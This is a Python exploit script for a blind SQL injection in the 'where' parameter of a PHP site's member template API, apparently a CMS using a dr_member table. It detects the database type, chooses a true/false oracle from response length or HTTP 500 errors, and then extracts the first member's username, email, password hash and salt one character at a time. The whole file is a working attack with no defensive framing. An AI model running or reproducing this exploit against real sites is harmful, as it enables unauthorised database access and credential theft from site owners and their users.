import sys, requests

b = sys.argv[1].rstrip("/")
u = b + "/index.php?s=member&c=api&m=template&name=list.html&catid=201 module=news where='"
s = requests.Session()

DBS = {
    "MySQLi":   ("1=1 AND @@version_comment=@@version_comment", "ASCII(SUBSTRING({},%d,1))"),
    "SQLite3":  ("1=1 AND sqlite_version()=sqlite_version()", "UNICODE(SUBSTR({},%d,1))"),
    "Postgre":  ("1=1 AND current_database()=current_database()", "ASCII(SUBSTRING({},%d,1))"),
    "SQLSRV":   ("1=1 AND DB_NAME()=DB_NAME()", "ASCII(SUBSTRING({},%d,1))"),
}


def req(x):
    return s.get(u + x + "'", timeout=25)


def parses(x):
    return req(x).status_code == 200


r1, r2 = req("1=1 AND 1=1"), req("1=1 AND 1=2")
L1, L2 = len(r1.text), len(r2.text)
if L1 != L2:
    MODE = "length"
elif req("1=1 AND (SELECT 1 UNION SELECT 2 FROM dr_member WHERE (1=1))=1").status_code == 500 and \
        req("1=1 AND (SELECT 1 UNION SELECT 2 FROM dr_member WHERE (1=2))=1").status_code == 200:
    MODE = "union"
else:
    MODE = "case"


def t(x):
    if MODE == "length":
        r = req(x)
        return abs(len(r.text) - L1) < abs(len(r.text) - L2)
    if MODE == "union":
        return req("1=1 AND (SELECT 1 UNION SELECT 2 FROM dr_member WHERE (%s))=1" % x).status_code == 500
    return req("1=1 AND CASE WHEN (%s) THEN 1 ELSE (SELECT 1 FROM nosuchtable_zz) END=1" % x).status_code != 500


db = "?"
for k in ("MySQLi", "SQLite3", "Postgre", "SQLSRV"):
    if parses(DBS[k][0]):
        db = k
        break
print("driver =", db, "| oracle =", MODE, flush=True)
if db == "?":
    print("no driver matched: base len=%d/%d status=%d/%d" % (L1, L2, r1.status_code, r2.status_code))
    sys.exit(1)
c = DBS[db][1]


def q(sql):
    v = c.format("(" + sql + ")")
    r = ""
    for i in range(1, 65):
        e = v % i
        if not t("1=1 AND %s BETWEEN 1 AND 126" % e):
            break
        a, z = 32, 126
        while a < z:
            m = (a + z) // 2
            if t("1=1 AND %s BETWEEN %d AND 126" % (e, m + 1)):
                a = m + 1
            else:
                z = m
        r += chr(a)
    return r


print("TRUE ", t("1=1 AND 1=1"))
print("FALSE", t("1=1 AND 1=2"))
print("UNKNOWN-COLUMN HTTP", s.get(u + "1=1 AND nosuchcolumn_zz=1'").status_code)

for f in ("username", "email", "password", "salt"):
    print("%-8s =" % f, q("SELECT %s FROM dr_member WHERE id=1" % f), flush=True)
